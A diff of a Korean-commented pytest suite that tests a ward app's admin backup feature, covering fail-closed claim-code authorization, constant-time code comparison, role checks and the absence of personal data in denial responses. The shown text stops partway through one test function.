@@ -1,24 +1,39 @@
-"""관리자용 데이터 백업 내려받기 + 미백업 경고
-(지시서 docs/orders/2026-08-20-백업-내려받기.md, T3 — **보완 지시 반영판**).
+"""관리자용 데이터 백업 내려받기 + 미백업 경고 — 품질부 검증 (T3).
 
-지시서의 수용 기준(본문 1~7 + 말미 "보완 지시" 필수 1~5)에서 설계했다.
-구현(app/backup.py)을 읽고 역산하지 않았다 — 엔드포인트 경로/요청 본문/상수명 같은
-**계약**만 확인했고, 기대값은 전부 지시서에서 왔다.
+**설계 출발점은 지시서의 수용 기준이다**
+(`docs/orders/2026-08-20-백업-내려받기.md` 본문 1~7 + 보완 지시, 그리고 그 뒤
+운영자 결정 **D-19**(권한 코드 방식)·**D-20**(복구 시 운영자 직접 업로드)로 갱신된
+기준). 구현(app/backup.py)을 읽고 역산하지 않았다 — 엔드포인트 경로·요청 본문·
+헤더 이름 같은 **계약**만 확인했고 기대값은 전부 기준에서 왔다.
 
-권한 판정은 **불변 내부 식별자 uid**(`DUTY_BACKUP_OWNER_UID`) 기준이다.
-옛 문자열 방식(`DUTY_BACKUP_OWNER`)은 제거됐고, 이 파일은 그것이 **아무 효과가
-없음**까지 검증한다(보완 지시 필수 1).
+이번 판(3차)에서 바뀐 것
+- 권한은 **환경변수 uid 목록이 아니라 `users.backup_owner` 플래그**다. 플래그는
+  운영자만 아는 **권한 코드**(`DUTY_BACKUP_CLAIM_CODE`)를 `POST /backup/claim`으로
+  제출한 계정에만 켜진다. `DUTY_BACKUP_OWNER_UID`·`DUTY_BACKUP_OWNER`는 **설정해도
+  아무 효과가 없어야 한다**(이 파일이 그것까지 검증한다).
+- 이력은 pending → (사람이 저장을 눈으로 확인) → confirm 의 **3단계**이고,
+  level 판정은 `ok` 행만 센다(`pending`·`fail`·`denied`·`archived` 제외).
+- 백업본(스냅샷)의 `ok` 이력은 `archived`로 치환된다 — **복구본은 언제나 critical**.
 
+규정 준수
+- 등장하는 이름·이메일·사번은 전부 **가명/가짜 값**이다(교훈 L-1). 사번은 실제와
+  겹치지 않도록 `99`로 시작하는 값만 쓴다.
 - 날짜는 전부 KST 상대 계산으로 만든다(하드코딩 금지, 교훈 L-4).
-- 등장하는 이름·이메일·사번은 전부 **가명/가짜 값**이다(교훈 L-1).
-  사번은 실제 사번과 겹치지 않도록 9로 시작하는 임의 값만 쓴다.
+- **권한 코드 실값은 저장소에 없다.** 테스트마다 `secrets`로 새로 만들어 환경변수로
+  주입한다.
+
+실행:  python -m pytest tests/test_backup.py -q
 """
 from __future__ import annotations
 
+import ast
 import csv
+import inspect
 import io
+import json
 import os
 import re
+import secrets
 import sqlite3
 import tempfile
 import threading
@@ -34,40 +49,49 @@ KST = timezone(timedelta(hours=9))
 
 BACKUP_URL = "/api/admin/backup"
 CONFIRM_URL = "/api/admin/backup/confirm"
+CLAIM_URL = "/api/admin/backup/claim"
 STATUS_URL = "/api/admin/backup/status"
 
-UID_ENV = "DUTY_BACKUP_OWNER_UID"
-LEGACY_ENV = "DUTY_BACKUP_OWNER"  # 제거된 옛 방식 — 설정해도 무효여야 한다
+CLAIM_ENV = "DUTY_BACKUP_CLAIM_CODE"
+# 제거된 옛 권한 경로 — 설정해도 무효여야 한다(D-19).
+LEGACY_UID_ENV = "DUTY_BACKUP_OWNER_UID"
+LEGACY_STR_ENV = "DUTY_BACKUP_OWNER"
 
 # 지시서 "산출물 구성": CSV는 7개 = 앱 테이블 전량에서 backup_log 제외
-#   (backup_log는 복구 정본 duty.db 안에 들어 있으므로 손실 없음 — 사무국 확정 해석)
+# (backup_log는 복구 정본 duty.db 안에 들어 있으므로 손실 없음).
 EXPECTED_CSV_TABLES = {
     "users", "ward_invites", "rosters", "schedules",
     "wanted_requests", "request_windows", "feedback",
 }
 BOM = b"\xef\xbb\xbf"
 
-# 보완 지시 필수 2 — CSV에서 지워져야 하는 자격증명 (테이블, 컬럼)
+# 명시적으로 가려져야 하는 자격증명 (테이블, 컬럼)
 CREDENTIAL_COLUMNS = [("users", "pw_hash"), ("users", "salt"), ("ward_invites", "code")]
+# 컬럼명 휴리스틱(fail-closed)이 잡아야 하는 **새로 추가된** 컬럼들
+NEW_SECRET_COLUMNS = ["reset_token", "api_key", "totp_secret", "recovery_code"]
 
 
 # ============================ 픽스처 / 헬퍼 ============================
 
 @pytest.fixture()
 def env(tmp_path, monkeypatch):
-    """DB·서버 임시 디렉터리를 테스트마다 격리한다(임시 파일 잔존 검사를 위해)."""
+    """DB·임시 디렉터리를 테스트마다 격리하고, 권한 관련 환경변수를 모두 지운다."""
+    import app.backup as backup
+
     db_dir = tmp_path / "dbdir"
     db_dir.mkdir()
     tmp_dir = tmp_path / "srvtmp"
     tmp_dir.mkdir()
     monkeypatch.setenv("DUTY_DB", str(db_dir / "test.db"))
-    monkeypatch.setenv("DUTY_SECRET", "test-secret-for-qa-suite-0001")
-    monkeypatch.delenv(UID_ENV, raising=False)
-    monkeypatch.delenv(LEGACY_ENV, raising=False)
-    # 서버가 만드는 임시 파일도 이 디렉터리 안으로 모은다.
+    monkeypatch.setenv("DUTY_SECRET", "test-secret-for-qa-suite-0003")
+    for name in (CLAIM_ENV, LEGACY_UID_ENV, LEGACY_STR_ENV):
+        monkeypatch.delenv(name, raising=False)
     monkeypatch.setenv("TMPDIR", str(tmp_dir))
     monkeypatch.setattr(tempfile, "tempdir", str(tmp_dir), raising=False)
-    return SimpleNamespace(db_dir=db_dir, tmp_dir=tmp_dir)
+    # 잠금 카운터는 **프로세스 메모리**다(알려진 한계). 테스트 간 격리를 위해 비운다.
+    backup._claim_fails.clear()
+    yield SimpleNamespace(db_dir=db_dir, tmp_dir=tmp_dir)
+    backup._claim_fails.clear()
 
 
 @pytest.fixture()
@@ -75,6 +99,20 @@ def client(env):
     from app.main import app
 
     return TestClient(app)
+
+
+def _new_claim_code(length: int = 24) -> str:
+    """테스트용 권한 코드를 **매번 새로** 만든다 — 저장소에 실값을 남기지 않는다."""
+    raw = secrets.token_urlsafe(length * 2).replace("-", "x").replace("_", "y")
+    return raw[:length]
+
+
+@pytest.fixture()
+def code(env, monkeypatch) -> str:
+    """유효한(충분히 긴) 권한 코드가 설정된 상태."""
+    value = _new_claim_code()
+    monkeypatch.setenv(CLAIM_ENV, value)
+    return value
 
 
 def _h(tok):
@@ -108,6 +146,14 @@ def _reg(client, *, email=None, empno=None, name="사용자", pw="password123", 
     if r.status_code == 403:  # 병동 기개설 → 초대 코드로 가입
         r = client.post("/api/auth/register", json={**body, "invite_code": _invite_code(ward)})
     assert r.status_code == 200, r.text
+    out = r.json()
+    out["_pw"] = pw
+    return out
+
+
+def _login(client, login_id, pw="password123"):
+    r = client.post("/api/auth/login", json={"login": login_id, "password": pw})
+    assert r.status_code == 200, r.text
     return r.json()
 
 
@@ -117,24 +163,26 @@ def _set_role(client, master, *, email, role):
     assert r.status_code == 200 and r.json()["role"] == role, r.text
 
 
-def _uid(user) -> int:
-    """가입/로그인 응답이 알려준 내 계정 번호(uid).
-
-    보완 지시 필수 1-4: 비개발자가 서버 접속 없이 자기 uid를 확인할 수 있어야 한다.
-    값이 실제 users.id와 같은지도 여기서 함께 확인한다(틀린 번호를 알려주면
-    운영자가 환경변수를 잘못 설정하게 되므로 이것 자체가 결함이다).
-    """
-    assert "uid" in user, f"로그인/가입 응답에 uid가 없음: {sorted(user)}"
-    value = user["uid"]
-    assert isinstance(value, int) and value > 0, f"uid가 양의 정수가 아님: {value!r}"
+def _uid_of(user) -> int:
+    """이 계정의 users.id — 응답에는 더 이상 없으므로(D-19) DB에서 읽는다."""
     conn = _db()
     try:
         row = conn.execute("SELECT id FROM users WHERE name=? AND ward=?",
                            (user["name"], user["ward"])).fetchone()
     finally:
         conn.close()
-    assert row is not None and row[0] == value, f"uid가 users.id와 다름: {value} != {row}"
-    return value
+    assert row is not None, f"계정을 찾지 못함: {user['name']}/{user['ward']}"
+    return int(row[0])
+
+
+def _flag_of(user) -> int:
+    conn = _db()
+    try:
+        row = conn.execute("SELECT backup_owner FROM users WHERE id=?",
+                           (_uid_of(user),)).fetchone()
+    finally:
+        conn.close()
+    return int(row[0])
 
 
 # ---- 등장인물(전원 가명 · 가짜 사번) ----
@@ -146,25 +194,36 @@ OTHER = SimpleNamespace(email="haneul@duty.kr", name="박하늘", empno="990004"
 
 @pytest.fixture()
 def people(client):
-    """61병동 master(백업 권한 후보)·admin·staff + 99병동의 다른 master."""
-    owner = _reg(client, email=OWNER.email, name=OWNER.name, ward=OWNER.ward)
+    """61병동 master(권한 후보)·admin·staff + 99병동의 다른 master."""
+    owner = _reg(client, email=OWNER.email, empno=OWNER.empno, name=OWNER.name, ward=OWNER.ward)
     assert owner["role"] == "master"
-    admin = _reg(client, email=ADMIN.email, name=ADMIN.name, ward=ADMIN.ward)
-    staff = _reg(client, email=STAFF.email, name=STAFF.name, ward=STAFF.ward)
+    admin = _reg(client, email=ADMIN.email, empno=ADMIN.empno, name=ADMIN.name, ward=ADMIN.ward)
+    staff = _reg(client, email=STAFF.email, empno=STAFF.empno, name=STAFF.name, ward=STAFF.ward)
     _set_role(client, owner, email=ADMIN.email, role="admin")
-    other = _reg(client, email=OTHER.email, name=OTHER.name, ward=OTHER.ward)
+    other = _reg(client, email=OTHER.email, empno=OTHER.empno, name=OTHER.name, ward=OTHER.ward)
     assert other["role"] == "master", "99병동 개설자는 그 병동의 master여야 함"
     # storage 스키마(backup_log 포함)를 만들어 둔다.
     assert client.get("/api/roster", headers=_h(owner["token"])).status_code == 200
     return SimpleNamespace(owner=owner, admin=admin, staff=staff, other=other)
 
 
-def _allow_uid(monkeypatch, *values):
-    """DUTY_BACKUP_OWNER_UID 설정 — 정수 uid나 이미 만들어진 문자열을 그대로 받는다."""
-    if len(values) == 1 and isinstance(values[0], str):
-        monkeypatch.setenv(UID_ENV, values[0])
-    else:
-        monkeypatch.setenv(UID_ENV, ",".join(str(v) for v in values))
+def _claim(client, user, value):
+    return client.post(CLAIM_URL, json={"code": value}, headers=_h(user["token"]))
+
+
+def _grant(client, user, value):
+    """권한 코드로 이 계정에 백업 권한을 등록한다(성공을 단언)."""
+    r = _claim(client, user, value)
+    assert r.status_code == 200, f"권한 등록 실패: {r.status_code} {r.text[:300]}"
+    assert _flag_of(user) == 1, "등록했는데 users.backup_owner 플래그가 켜지지 않음"
+    return r
+
+
+@pytest.fixture()
+def owner_ok(client, people, code):
+    """권한 코드를 등록해 백업 권한을 가진 61병동 master."""
+    _grant(client, people.owner, code)
+    return people.owner
 
 
 def _log_rows():
@@ -175,6 +234,10 @@ def _log_rows():
         return [dict(r) for r in conn.execute("SELECT * FROM backup_log ORDER BY id")]
     finally:
         conn.close()
+
+
+def _rows_with(status):
+    return [r for r in _log_rows() if r["status"] == status]
 
 
 def _zip_of(resp) -> zipfile.ZipFile:
@@ -189,8 +252,15 @@ def _csv_names(zf) -> set[str]:
             if n.startswith("tables/") and n.endswith(".csv")}
 
 
-def _extract_db(zf, dest) -> str:
-    path = os.path.join(str(dest), "restored.db")
+def _csv_rows(zf, table):
+    raw = zf.read(f"tables/{table}.csv")
+    assert raw[:3] == BOM, f"{table}.csv 가 UTF-8 BOM으로 시작하지 않음: {raw[:6]!r}"
+    text = raw.decode("utf-8-sig")
+    return list(csv.DictReader(io.StringIO(text)))
+
+
+def _extract_db(zf, dest, name="restored.db") -> str:
+    path = os.path.join(str(dest), name)
     with open(path, "wb") as f:
         f.write(zf.read("duty.db"))
     return path
@@ -217,7 +287,7 @@ def _confirm(client, user, backup_id, size):
 
 
 def _full_backup(client, user):
-    """지시서가 정의한 '성공한 백업' 1회 = 내려받기 + 확정(confirm)."""
+    """기준이 정의한 '성공한 백업' 1회 = 내려받기 + 사람 확인 후 확정(confirm)."""
     r, bid = _download(client, user)
     ok = _confirm(client, user, bid, len(r.content))
     assert ok.status_code == 200, f"confirm 실패: {ok.status_code} {ok.text[:300]}"
@@ -243,17 +313,10 @@ def _assert_no_leftovers(env, before_tmp, before_db, *, where=""):
 # ---- KST 상대 시각 ----
 
 def _kst_days_ago(n: int, *, flip_utc_date: bool = False) -> datetime:
-    """지금으로부터 **KST 달력 기준** 정확히 n일 전인 시각.
-
-    flip_utc_date=True면 '지금'과 반대편 UTC 날짜 구간(KST 00~09시 / 09~24시)을
-    골라, **UTC 달력으로 세면 n이 나오지 않는** 시각을 만든다. 수용 기준 5의
-    "UTC로 계산하면 결과가 달라지는 경계 시각" 검증용.
-    """
+    """지금으로부터 **KST 달력 기준** 정확히 n일 전인 시각."""
     now_kst = datetime.now(timezone.utc).astimezone(KST)
     d = (now_kst - timedelta(days=n)).date()
     if flip_utc_date:
-        # KST 시각이 09시 미만이면 그 시점의 UTC 날짜 = KST 날짜 - 1.
-        # '지금'과 반대가 되도록 대상 시각의 시(hour)를 고른다.
         hour = 12 if now_kst.hour < 9 else 3
     else:
         hour = 12
@@ -261,7 +324,6 @@ def _kst_days_ago(n: int, *, flip_utc_date: bool = False) -> datetime:
 
 
 def _utc_date_diff(dt: datetime) -> int:
-    """UTC 달력으로 센 경과일(테스트 자기검증용)."""
     now_utc = datetime.now(timezone.utc)
     return (now_utc.date() - dt.astimezone(timezone.utc).date()).days
 
@@ -278,12 +340,8 @@ def _insert_log_row(dt: datetime, *, status: str = "ok", uid: int = 1, size: int
         conn.close()
 
 
-def _set_last_backup(dt: datetime | None):
-    """backup_log를 원하는 '마지막 성공 시각' 하나만 남긴 상태로 만든다.
-
-    저장은 UTC ISO — 저장소 관례(app.storage._now)와 동일(교훈 L-4).
-    actor는 uid 형식만 쓴다(보완 지시: 이력에 사번·이메일 금지).
-    """
+def _set_last_backup(dt, *, status: str = "ok"):
+    """backup_log를 '마지막 성공 시각' 하나만 남긴 상태로 만든다(저장은 UTC ISO)."""
     conn = _db()
     try:
         conn.execute("DELETE FROM backup_log")
@@ -291,754 +349,938 @@ def _set_last_backup(dt: datetime | None):
     finally:
         conn.close()
     if dt is not None:
-        _insert_log_row(dt)
+        _insert_log_row(dt, status=status)
 
 
 def _status(client, user):
     r = client.get(STATUS_URL, headers=_h(user["token"]))
     assert r.status_code == 200, f"{r.status_code} {r.text[:300]}"
     body = r.json()
-    for key in ("last_backup_at", "days_since", "level"):
+    for key in ("last_backup_at", "days_since", "level", "denied_last_30d"):
         assert key in body, f"상태 응답에 {key} 없음: {body}"
     return body
 
 
-# ============================ 수용 기준 1 — 권한 경계 (uid) ============================
+# ==================== G. 권한 — 권한 코드(claim) fail-closed ====================
+#
+# 폐기된 기준(uid 환경변수 allowlist)의 자리를 대신한다. 옛 기준의
+# test_ac1_uid_env_is_fail_closed[*] 9건 · test_ac1_legacy_string_env_has_no_effect ·
+# test_ac1_uid_allowlist_comma_list_and_whitespace 는 기준 자체가 사라졌으므로
+# 아래 "코드 fail-closed" 묶음으로 대체했다.
 
-def test_ac1_allowlisted_master_gets_zip(client, people, monkeypatch):
-    """허가 uid(allowlist ∧ master) → 200 + ZIP 첨부."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
-    assert r.status_code == 200, f"{r.status_code} {r.text[:400]}"
-    assert r.content[:2] == b"PK", "본문이 ZIP이 아님"
-    disp = r.headers.get("content-disposition", "")
-    assert ".zip" in disp.lower(), f"첨부 파일명(.zip)이 없음: {disp!r}"
-
-
-def test_ac1_master_of_other_ward_denied(client, people, monkeypatch):
-    """allowlist에 없는 master(= 다른 병동 개설자)는 403 — 역할만으로 열리면 안 된다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    r = client.get(BACKUP_URL, headers=_h(people.other["token"]))
-    assert r.status_code == 403, f"타 병동 master가 백업을 받음: {r.status_code}"
-
-
-def test_ac1_admin_and_staff_denied_even_if_allowlisted(client, people, monkeypatch):
-    """admin·staff는 allowlist에 uid가 있어도 403 — allowlist ∧ role==master."""
-    _allow_uid(monkeypatch, _uid(people.admin), _uid(people.staff), _uid(people.owner))
-    assert client.get(BACKUP_URL, headers=_h(people.admin["token"])).status_code == 403
-    assert client.get(BACKUP_URL, headers=_h(people.staff["token"])).status_code == 403
-    # 대조군: 같은 설정에서 master는 통과해야 판정이 '전부 막기'가 아님이 증명된다.
-    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
-
-
-def test_ac1_unauthenticated_is_401(client, people, monkeypatch):
-    _allow_uid(monkeypatch, _uid(people.owner))
-    assert client.get(BACKUP_URL).status_code == 401
-    assert client.get(BACKUP_URL, headers={"Authorization": "Bearer not-a-real-token"}
-                      ).status_code == 401
-    assert client.get(STATUS_URL).status_code == 401
-    assert client.post(CONFIRM_URL, json={"id": 1, "bytes": 1}).status_code == 401
-
-
-@pytest.mark.parametrize("value", [
-    "",                    # 빈 값
-    "   ",                 # 공백만
-    "{uid},abc",           # 정수가 아닌 값이 섞임 → 설정 전체 무효
-    "abc",                 # 정수가 전혀 없음
-    "{uid},0",             # 0이 섞임
-    "0",
-    "{uid},-1",            # 음수가 섞임
-    "-1",
-    "{uid}.0",             # 정수 표기가 아님
-    "{uid};{uid}",         # 구분자 오기(콤마 아님)
-])
-def test_ac1_uid_env_is_fail_closed(client, people, monkeypatch, value):
-    """미설정·빈 값·정수 아닌 값·0·음수가 섞이면 **설정 전체 무효 = 전원 403**.
-
-    "1은 살리고 abc만 무시"하는 부분 수용은 금지 — 오타 하나로 의도하지 않은
-    계정이 열릴 수 있고, 운영자는 설정이 먹혔다고 착각한다(fail-closed).
-    """
-    uid = _uid(people.owner)
-    monkeypatch.setenv(UID_ENV, value.format(uid=uid))
-    for who in (people.owner, people.admin, people.staff, people.other):
-        r = client.get(BACKUP_URL, headers=_h(who["token"]))
-        assert r.status_code == 403, f"{UID_ENV}={value!r} 인데 {r.status_code}"
-    assert client.get(STATUS_URL, headers=_h(people.owner["token"])).status_code == 403
-
-
-def test_ac1_unset_env_denies_everyone(client, people, monkeypatch):
-    """DUTY_BACKUP_OWNER_UID 미설정이면 전원 403(기본 개방 금지)."""
-    monkeypatch.delenv(UID_ENV, raising=False)
-    for who in (people.owner, people.admin, people.staff, people.other):
-        assert client.get(BACKUP_URL, headers=_h(who["token"])).status_code == 403
-
-
-def test_ac1_legacy_string_env_has_no_effect(client, people, monkeypatch):
-    """옛 `DUTY_BACKUP_OWNER`(사번/이메일)는 **완전히 제거**됐다.
-
-    (1) 옛 변수만 설정하면 아무도 못 들어온다.
-    (2) 옛 변수에 엉뚱한 값이 있어도 uid 허가는 정상 동작한다(간섭 없음).
-    """
-    monkeypatch.delenv(UID_ENV, raising=False)
-    monkeypatch.setenv(LEGACY_ENV, f"{OWNER.email},{OWNER.empno}")
-    for who in (people.owner, people.admin, people.staff, people.other):
-        r = client.get(BACKUP_URL, headers=_h(who["token"]))
-        assert r.status_code == 403, f"제거된 {LEGACY_ENV}로 접근이 열림: {r.status_code}"
-
-    monkeypatch.setenv(LEGACY_ENV, "nobody@example.invalid")
-    _allow_uid(monkeypatch, _uid(people.owner))
-    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
-
-
-def test_ac1_uid_allowlist_comma_list_and_whitespace(client, people, monkeypatch):
-    """콤마로 여러 uid, 공백이 섞여도 동작한다(배포 환경변수 실수 방지)."""
-    owner_uid, other_uid = _uid(people.owner), _uid(people.other)
-    monkeypatch.setenv(UID_ENV, f" {other_uid} , {owner_uid} ")
-    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
-    assert client.get(BACKUP_URL, headers=_h(people.other["token"])).status_code == 200
-    # 목록에서 빼면 즉시 막힌다(재시작 없이 환경변수만으로 통제 가능해야 함).
-    _allow_uid(monkeypatch, other_uid)
+def test_claim_disabled_when_code_unset(client, people):
+    """권한 코드 **미설정** → 등록 기능 자체가 꺼진다(전원 거부)."""
+    r = _claim(client, people.owner, "anything-at-all-1234")
+    assert r.status_code == 403, f"코드 미설정인데 {r.status_code}: {r.text[:200]}"
+    assert _flag_of(people.owner) == 0, "코드가 없는데 권한 플래그가 켜졌다"
     assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403
 
 
-def test_ac1_denial_body_has_no_personal_info(client, people, monkeypatch):
-    """거부 응답 본문에 실명·사번·이메일이 실리지 않는다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    secrets = [p.name for p in (OWNER, ADMIN, STAFF, OTHER)]
-    secrets += [p.empno for p in (OWNER, ADMIN, STAFF, OTHER)]
-    secrets += [p.email for p in (OWNER, ADMIN, STAFF, OTHER)]
-    responses = [
-        client.get(BACKUP_URL),
-        client.get(BACKUP_URL, headers=_h(people.staff["token"])),
-        client.get(BACKUP_URL, headers=_h(people.admin["token"])),
-        client.get(BACKUP_URL, headers=_h(people.other["token"])),
-        client.get(STATUS_URL, headers=_h(people.staff["token"])),
-        client.post(CONFIRM_URL, json={"id": 1, "bytes": 1},
-                    headers=_h(people.staff["token"])),
-    ]
-    for r in responses:
-        assert r.status_code in (401, 403), r.status_code
-        text = r.text
-        for s in secrets:
-            assert s not in text, f"거부 본문에 신원 정보 노출({s!r}): {text[:300]}"
+@pytest.mark.parametrize("value", ["", "   ", "\t\n"])
+def test_claim_disabled_when_code_blank(client, people, monkeypatch, value):
+    """빈 값·공백만 있는 코드 → 비활성. 그 공백 문자열을 그대로 제출해도 거부."""
+    monkeypatch.setenv(CLAIM_ENV, value)
+    for attempt in (value, value.strip(), "x"):
+        r = _claim(client, people.owner, attempt)
+        assert r.status_code == 403, f"빈 코드({value!r})에 {attempt!r} → {r.status_code}"
+    assert _flag_of(people.owner) == 0
 
 
-def test_ac1_status_endpoint_restricted_to_owner(client, people, monkeypatch):
-    """상태 조회도 허가 계정 전용 — staff·admin·타병동 master에게 새어 나가면 안 된다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
+@pytest.mark.parametrize("length", [1, 4, 7])
+def test_claim_disabled_for_short_code(client, people, monkeypatch, length):
+    """**8자 미만**이면 정답을 그대로 넣어도 거부 — 약한 코드로 문이 열리면 안 된다."""
+    weak = _new_claim_code(length)
+    assert len(weak) == length
+    monkeypatch.setenv(CLAIM_ENV, weak)
+    r = _claim(client, people.owner, weak)
+    assert r.status_code == 403, f"{length}자 코드로 등록이 됐다: {r.status_code} {r.text[:200]}"
+    assert _flag_of(people.owner) == 0, f"{length}자 코드로 권한 플래그가 켜졌다"
+    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403
+
+
+def test_claim_enabled_at_eight_chars(client, people, monkeypatch):
+    """경계: **정확히 8자**면 등록이 동작한다(그 아래는 위 테스트에서 전원 거부)."""
+    exact = _new_claim_code(8)
+    assert len(exact) == 8
+    monkeypatch.setenv(CLAIM_ENV, exact)
+    _grant(client, people.owner, exact)
+    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 200
+
+
+def test_claim_wrong_code_is_denied(client, people, code):
+    """코드가 설정돼 있어도 **틀린 코드**는 거부되고 플래그도 켜지지 않는다."""
+    r = _claim(client, people.owner, _new_claim_code())
+    assert r.status_code == 403, f"틀린 코드인데 {r.status_code}"
+    assert _flag_of(people.owner) == 0
+    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403
+
+
+@pytest.mark.parametrize("kind", ["prefix", "suffix_cut", "one_char_off", "case_flip"])
+def test_claim_near_miss_codes_are_denied(client, people, code, kind):
+    """거의 맞는 코드(앞자리 일치·한 글자 차이·대소문자 변형)도 전부 거부."""
+    if kind == "prefix":
+        attempt = code[: len(code) // 2]
+    elif kind == "suffix_cut":
+        attempt = code[:-1]
+    elif kind == "one_char_off":
+        last = "z" if code[-1] != "z" else "q"
+        attempt = code[:-1] + last
+    else:
+        attempt = code.swapcase()
+        if attempt == code:  # 알파벳이 없으면 다른 변형으로
+            attempt = code + "A"
+    assert attempt != code, "테스트 자기검증 실패: 정답과 같은 값을 제출했다"
+    r = _claim(client, people.owner, attempt)
+    assert r.status_code == 403, f"{kind}({attempt!r})가 통과했다: {r.status_code}"
+    assert _flag_of(people.owner) == 0
+
+
+def test_claim_uses_constant_time_comparison(client):
+    """코드 비교는 **상수 시간**(hmac.compare_digest)이어야 한다.
+
+    실행 시간을 재는 통계적 테스트는 컨테이너에서 불안정(플레이크)해 게이트로
+    쓸 수 없다. 대신 "무엇으로 비교하는가"를 코드 계약으로 고정한다 —
+    `==` 비교로 되돌리면 이 테스트가 깨진다.
+    """
+    import app.backup as backup
+
+    src = inspect.getsource(backup.claim_backup_owner)
+    # 주석에 적힌 이름에 속지 않도록 **구문 트리**로 본다(주석만 남기고 비교를
+    # ==/!= 로 바꾸는 회귀를 실제로 겪었다).
+    tree = ast.parse(src)
+    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call)
+             and getattr(n.func, "attr", getattr(n.func, "id", "")) == "compare_digest"]
+    assert calls, ("claim 경로가 상수 시간 비교(hmac.compare_digest)를 쓰지 않는다:\n" + src)
+    for node in ast.walk(tree):
+        if not isinstance(node, ast.Compare):
+            continue
+        names = {getattr(x, "attr", getattr(x, "id", ""))
+                 for x in [node.left, *node.comparators]}
+        assert "code" not in names, (
+            "claim 경로가 코드를 직접 비교한다(==/!=) — 타이밍으로 앞자리가 샌다:\n"
+            + ast.dump(node))
+
+
+def test_claim_grants_flag_and_opens_backup(client, people, code):
+    """정답 코드 제출 → `users.backup_owner` 플래그 ON → 200 + ZIP."""
+    before = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
+    assert before.status_code == 403, "등록 전에 이미 열려 있다"
+    _grant(client, people.owner, code)
+    r = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
+    assert r.status_code == 200, f"{r.status_code} {r.text[:300]}"
+    assert r.content[:2] == b"PK", "본문이 ZIP이 아님"
+    assert ".zip" in r.headers.get("content-disposition", "").lower()
+
+
+def test_claim_is_repeatable_for_same_account(client, people, code):
+    """이미 권한이 있는 계정이 다시 등록해도 200(멱등) — 플래그는 그대로 1."""
+    _grant(client, people.owner, code)
+    again = _claim(client, people.owner, code)
+    assert again.status_code == 200, f"재등록이 {again.status_code}"
+    assert _flag_of(people.owner) == 1
+
+
+def test_permission_survives_relogin_and_code_removal(client, people, code, monkeypatch):
+    """권한은 **계정에 붙는다** — 재로그인해도, 코드를 환경에서 지워도 유지된다.
+
+    (배포 문서가 "등록 뒤 코드는 지워도 된다"고 안내하는 근거.)
+    """
+    _grant(client, people.owner, code)
+    monkeypatch.delenv(CLAIM_ENV, raising=False)
+    fresh = _login(client, OWNER.empno)
+    r = client.get(BACKUP_URL, headers=_h(fresh["token"]))
+    assert r.status_code == 200, f"재로그인 후 {r.status_code} — 권한이 계정에 붙어 있지 않다"
+
+
+@pytest.mark.parametrize("who", ["staff", "admin"])
+def test_non_master_cannot_claim_even_with_correct_code(client, people, code, who):
+    """staff·admin은 **정답 코드를 알아도** 등록 불가(role==master 결합 조건)."""
+    user = getattr(people, who)
+    r = _claim(client, user, code)
+    assert r.status_code == 403, f"{who}가 정답 코드로 등록에 성공했다: {r.status_code}"
+    assert _flag_of(user) == 0, f"{who}의 권한 플래그가 켜졌다"
+    assert client.get(BACKUP_URL, headers=_h(user["token"])).status_code == 403
+
+
+def test_flagged_account_loses_access_when_demoted(client, people, code):
+    """플래그가 있어도 role이 master가 아니면 거부 — 강등된 계정은 권한을 못 쓴다."""
+    _grant(client, people.owner, code)
+    conn = _db()
+    try:  # 강등(운영자가 역할을 바꾼 상황)
+        conn.execute("UPDATE users SET role='admin' WHERE id=?", (_uid_of(people.owner),))
+        conn.commit()
+    finally:
+        conn.close()
+    fresh = _login(client, OWNER.empno)
+    assert fresh["role"] == "admin"
+    r = client.get(BACKUP_URL, headers=_h(fresh["token"]))
+    assert r.status_code == 403, f"강등됐는데 {r.status_code}"
+
+
+def test_master_without_flag_is_denied(client, people, code):
+    """다른 병동 master(코드 미등록)는 403 — 역할만으로는 절대 열리지 않는다."""
+    _grant(client, people.owner, code)
+    r = client.get(BACKUP_URL, headers=_h(people.other["token"]))
+    assert r.status_code == 403, f"미등록 master에게 {r.status_code}"
+    assert r.content[:2] != b"PK"
+
+
+@pytest.mark.parametrize("url,method", [
+    (BACKUP_URL, "GET"), (STATUS_URL, "GET"), (CLAIM_URL, "POST"), (CONFIRM_URL, "POST")])
+def test_unauthenticated_is_401(client, people, code, url, method):
+    """무인증은 전 경로 401(권한 이전에 인증)."""
+    if method == "GET":
+        r = client.get(url)
+    else:
+        body = {"code": code} if url == CLAIM_URL else {"id": 1, "bytes": 1}
+        r = client.post(url, json=body)
+    assert r.status_code == 401, f"{method} {url} → {r.status_code}"
+    for bad in ({"Authorization": "Bearer not-a-token"}, {"Authorization": "Basic x"}):
+        rr = client.get(url, headers=bad) if method == "GET" else client.post(
+            url, json={"code": "x"}, headers=bad)
+        assert rr.status_code == 401, f"위조 토큰 {bad} → {rr.status_code}"
+
+
+def test_denial_body_carries_no_personal_info(client, people, code):
+    """거부 응답 본문에 실명·사번·이메일이 없다(교훈 L-1)."""
+    _grant(client, people.owner, code)
+    leaks = [OWNER.name, OWNER.empno, OWNER.email, ADMIN.name, ADMIN.empno,
+             STAFF.name, STAFF.empno, STAFF.email]
+    for user in (people.staff, people.admin, people.other):
+        for r in (client.get(BACKUP_URL, headers=_h(user["token"])),
+                  client.get(STATUS_URL, headers=_h(user["token"])),
+                  _claim(client, user, _new_claim_code())):
+            assert r.status_code in (403, 429), r.status_code
+            body = r.text
+            for leak in leaks:
+                assert leak not in body, f"거부 응답에 개인정보 노출: {leak} in {body[:200]}"
+
+
+def test_status_endpoint_is_owner_only(client, people, code):
+    """/backup/status 도 허가 계정 전용(경고 상태는 권한 정보다)."""
+    for user in (people.staff, people.admin, people.other, people.owner):
